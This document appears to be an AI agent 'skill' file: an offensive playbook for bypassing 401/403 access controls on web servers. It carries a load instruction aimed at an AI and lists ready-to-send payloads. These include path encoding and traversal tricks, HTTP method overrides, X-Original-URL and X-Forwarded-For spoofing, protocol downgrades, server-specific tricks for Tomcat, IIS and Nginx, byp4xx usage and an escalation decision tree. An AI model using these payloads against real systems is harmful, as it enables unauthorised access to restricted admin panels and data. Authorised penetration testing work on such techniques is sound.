---
name: 401-403-bypass-techniques
description: >-
  401/403 bypass playbook. Use when encountering access-denied responses on admin panels, API endpoints, or restricted paths. Covers path manipulation, HTTP method tampering, header injection, protocol downgrade, and automated bypass tools.
---

# SKILL: 401/403 Bypass Techniques — Expert Attack Playbook

> **AI LOAD INSTRUCTION**: Comprehensive 401/403 forbidden bypass techniques. Covers path normalization tricks, HTTP method override, header-based bypasses (X-Original-URL, X-Forwarded-For), protocol version tricks, and combination attacks. Base models typically know 2-3 header bypasses but miss the full matrix of path manipulation variants and verb+path combos.

## 0. RELATED ROUTING

- [authbypass-authentication-flaws](../authbypass-authentication-flaws/SKILL.md) — broader auth bypass (login flaws, session handling)
- [waf-bypass-techniques](../waf-bypass-techniques/SKILL.md) — when bypass is WAF-specific rather than access control
- [http-host-header-attacks](../http-host-header-attacks/SKILL.md) — Host header manipulation for routing bypass
- [request-smuggling](../request-smuggling/SKILL.md) — smuggle past access controls entirely
- [http2-specific-attacks](../http2-specific-attacks/SKILL.md) — h2c smuggling to bypass proxy ACLs

---

## 1. PATH MANIPULATION BYPASSES

The core idea: the reverse proxy/WAF checks one path format, but the backend normalizes differently.

### 1.1 Trailing Slash / Missing Slash

```
/admin      → 403
/admin/     → 200  ✓ (trailing slash)
/admin/.    → 200  ✓ (trailing dot)
```

### 1.2 Case Sensitivity

```
/admin      → 403
/Admin      → 200  ✓
/ADMIN      → 200  ✓
/aDmIn      → 200  ✓
```

Works when: proxy rule is case-sensitive but backend is case-insensitive (common on Windows/IIS).

### 1.3 URL Encoding

```
/admin          → 403
/%61dmin        → 200  ✓ (encode 'a')
/admi%6e        → 200  ✓ (encode 'n')
/%61%64%6d%69%6e → 200  ✓ (full encode)
```

### 1.4 Double URL Encoding

```
/admin              → 403
/%2561dmin          → 200  ✓ (%25 = %, decoded twice: %61 → a)
/admin%252f         → 200  ✓
/admin..%252f       → 200  ✓
```

### 1.5 Unicode / UTF-8 Encoding

```
/admin          → 403
/admi%C0%AE     → 200  ✓ (overlong UTF-8 for '.')
/admi%C0%6E     → 200  ✓ (overlong encoding)
/%C0%AFadmin    → 200  ✓ (overlong '/')
```

### 1.6 Dot-Segment / Path Traversal

```
/admin          → 403
/./admin        → 200  ✓
//admin         → 200  ✓
/admin/./       → 200  ✓
/.//admin       → 200  ✓
/admin..;/      → 200  ✓ (Tomcat path parameter)
```

### 1.7 Null Byte

```
/admin          → 403
/admin%00       → 200  ✓
/admin%00.json  → 200  ✓
/%00/admin      → 200  ✓
```

### 1.8 Path Parameter Injection

```
/admin          → 403
/admin;foo=bar  → 200  ✓ (Tomcat/Java treats ; as path param)
/admin;         → 200  ✓
/admin;x        → 200  ✓
```

### 1.9 Trailing Special Characters

```
/admin%20 (space)  /admin%09 (tab)   /admin? (empty query)
/admin.json        /admin.html       /admin/~
```

### 1.10 Backslash (Windows/IIS)

```
/admin\    /admin\..\/    \..\admin
```

### 1.11 Combined Path Tricks

```
///admin///    /./admin/./    /admin/..;/admin (Tomcat)    /%2e/admin
```

---

## 2. HTTP METHOD BYPASS

### 2.1 Direct Method Change

```
GET  /admin → 403
POST /admin → 200  ✓
PUT  /admin → 200  ✓
PATCH /admin → 200  ✓
DELETE /admin → 200  ✓
OPTIONS /admin → 200  ✓ (may leak allowed methods)
TRACE /admin → 200  ✓ (may reflect headers — XST)
HEAD /admin → 200  ✓ (same as GET but no body — confirms access)
```

### 2.2 Method Override Headers

When the proxy blocks by method, but the backend reads override headers:

```http
GET /admin HTTP/1.1
X-HTTP-Method-Override: PUT

GET /admin HTTP/1.1
X-Method-Override: POST

GET /admin HTTP/1.1
X-HTTP-Method: DELETE

POST /admin HTTP/1.1
X-HTTP-Method-Override: PATCH
_method=PUT  (in POST body — Rails, Laravel)
```

### 2.3 Custom / Invalid Methods

```
FOOBAR /admin HTTP/1.1     → some ACLs only check GET/POST
GETS /admin HTTP/1.1       → typo-like methods may bypass
CONNECT /admin HTTP/1.1    → proxy may tunnel
PROPFIND /admin HTTP/1.1   → WebDAV method
MOVE /admin HTTP/1.1       → WebDAV method
```

---

## 3. HEADER-BASED BYPASS

### 3.1 URL Rewrite Headers (Nginx/IIS)

These headers tell the backend the "real" URL, bypassing proxy-level path checks:

```http
GET / HTTP/1.1
X-Original-URL: /admin

GET / HTTP/1.1
X-Rewrite-URL: /admin
```

The proxy sees `GET /` (allowed), but the backend routes to `/admin`.

### 3.2 IP Spoofing Headers (Whitelist Bypass)

Headers to try (each with values `127.0.0.1`, `10.0.0.1`, `0.0.0.0`, `::1`):

```http
X-Forwarded-For | X-Real-IP | X-Originating-IP | X-Remote-IP
X-Remote-Addr | X-Client-IP | True-Client-IP | Cluster-Client-IP
X-ProxyUser-IP | X-Custom-IP-Authorization | Forwarded: for=127.0.0.1
```

IP encoding variants: `0177.0.0.1` (octal), `2130706433` (decimal), `0x7f000001` (hex), `localhost`

### 3.3 Other Header Tricks

```http
Referer: https://target.com/admin     # Referrer check bypass
Origin: https://target.com             # Origin check bypass
Host: localhost                         # Host header manipulation
X-Forwarded-Host: localhost            # Forwarded host
Content-Type: application/json         # Content-type switch
X-Requested-With: XMLHttpRequest       # AJAX flag
```

---

## 4. PROTOCOL VERSION BYPASS

```http
# HTTP/1.0 (some ACLs only apply to HTTP/1.1)
GET /admin HTTP/1.0

# HTTP/0.9 (extremely legacy — no headers)
GET /admin

# HTTP/2 pseudo-header tricks
:method: GET
:path: /admin
:authority: target.com
# See ../http2-specific-attacks/SKILL.md for H2-specific bypasses
```

---

## 5. VERB TAMPERING + PATH COMBINATION

Combine multiple techniques for higher success rate:

```http
POST / HTTP/1.1                          # method override + URL rewrite
X-Original-URL: /admin
X-HTTP-Method-Override: GET

GET /%61dmin HTTP/1.1                    # IP spoof + path encoding
X-Forwarded-For: 127.0.0.1

GET /Admin HTTP/1.0                      # protocol + case + IP spoof
X-Forwarded-For: 127.0.0.1
```

---

## 6. TECHNOLOGY-SPECIFIC BYPASSES

| Server | Key Tricks |
|---|---|
| **Apache** | `/admin/` (trailing slash), `/.admin` (dot prefix), `/admin%0d` (CR) |
| **Nginx** | `/Admin` (case), `/admin../` (normalization), `X-Original-URL: /admin` |
| **IIS/ASP.NET** | `/admin;.css` (path param+ext), `/admin\` (backslash), `/admin::$DATA` (ADS), `/admin%20` |
| **Tomcat/Java** | `/admin;foo` (path param), `/admin..;/` (traversal), `/;/admin` (empty param) |
| **Spring** | `/admin.anything` (suffix matching, older), `/admin/` (trailing slash) |

---

## 7. AUTOMATED TOOLS

| Tool | Purpose | URL |
|---|---|---|
| **byp4xx** | Comprehensive 403 bypass scanner | github.com/lobuhi/byp4xx |
| **403bypasser** | Automated header/path/method bypass | github.com/sting8k/403bypasser |
| **dirsearch** | Directory brute-force with encoding variants | github.com/maurosoria/dirsearch |
| **feroxbuster** | Recursive content discovery | github.com/epi052/feroxbuster |
| **Burp Intruder** | Custom payload lists for manual testing | portswigger.net |

### byp4xx usage

```bash
# Basic usage
./byp4xx.sh https://target.com/admin

# Output shows all attempted bypasses and their response codes
# 200/301/302 responses = potential bypass found
```

---

## 8. DECISION TREE

```
Got 401 or 403 on a path?
│
├── Try PATH MANIPULATION first (highest success rate)
│   ├── /path/      (trailing slash)
│   ├── /PATH       (case change)
│   ├── /path%20    (trailing space)
│   ├── /./path     (dot segment)
│   ├── //path      (double slash)
│   ├── /path;x     (path parameter — Java/Tomcat)
│   ├── /path..;/   (Tomcat specific)
│   ├── /%2e/path   (encoded dot)
│   ├── /path%00    (null byte)
│   ├── /path%23    (encoded hash)
│   └── Result? → 200 = bypass found
│
├── Path tricks failed → Try METHOD BYPASS
│   ├── POST/PUT/PATCH/DELETE/OPTIONS
│   ├── HEAD (same as GET without body)
│   ├── X-HTTP-Method-Override: PUT
│   └── TRACE (may reflect auth headers — XST)
│
├── Method tricks failed → Try HEADER BYPASS
│   ├── X-Original-URL: /path      (Nginx/IIS rewrite)
│   ├── X-Rewrite-URL: /path       (same concept)
│   ├── X-Forwarded-For: 127.0.0.1 (IP whitelist)
│   ├── X-Real-IP: 127.0.0.1
│   ├── True-Client-IP: 127.0.0.1
│   └── Referer: https://target.com/path
│
├── Header tricks failed → Try PROTOCOL BYPASS
│   ├── HTTP/1.0 instead of 1.1
│   ├── HTTP/2 h2c smuggling (../http2-specific-attacks/)
│   └── WebSocket upgrade
│
├── Single techniques failed → Try COMBINATIONS
│   ├── Method + Path: POST /PATH/
│   ├── Header + Path: X-Forwarded-For + /path%20
│   ├── All three: POST + X-Original-URL + IP headers
│   └── Protocol + Path: HTTP/1.0 + encoded path
│
├── All bypasses failed → Consider ALTERNATIVE APPROACHES
│   ├── Request smuggling (../request-smuggling/) → smuggle past ACL
│   ├── SSRF (../ssrf-server-side-request-forgery/) → access from server
│   ├── IDOR (../idor-broken-object-authorization/) → access data directly
│   └── Auth flaws (../authbypass-authentication-flaws/) → login bypass
│
└── Automated scan with byp4xx / 403bypasser for completeness
```

---

## 9. QUICK REFERENCE — KEY PAYLOADS

```http
# Top 10 quick-wins (try these first)
GET /admin/     HTTP/1.1        # trailing slash
GET /Admin      HTTP/1.1        # case change
GET /admin%20   HTTP/1.1        # trailing space
GET /./admin    HTTP/1.1        # dot segment
GET //admin     HTTP/1.1        # double slash
POST /admin     HTTP/1.1        # method change
GET / HTTP/1.1                  # X-Original-URL bypass
X-Original-URL: /admin
GET /admin HTTP/1.1             # IP whitelist bypass
X-Forwarded-For: 127.0.0.1
GET /admin;.css HTTP/1.1        # IIS path param
GET /admin..;/ HTTP/1.1         # Tomcat bypass
```
